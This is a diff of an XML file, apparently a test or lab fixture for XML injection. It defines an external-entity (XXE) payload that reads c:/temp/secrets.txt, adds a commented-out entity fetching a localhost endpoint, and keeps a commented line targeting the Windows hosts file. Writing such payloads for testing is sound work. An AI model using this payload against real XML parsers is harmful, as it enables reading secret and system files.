@@ -1,6 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE user [
         <!ENTITY xxe SYSTEM "file:///c:/temp/secrets.txt" >
+        <!--<!ENTITY xxe SYSTEM "http://localhost:7171/xmli/users" >-->
         <!--<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >-->
         ]>
 <user id="001">
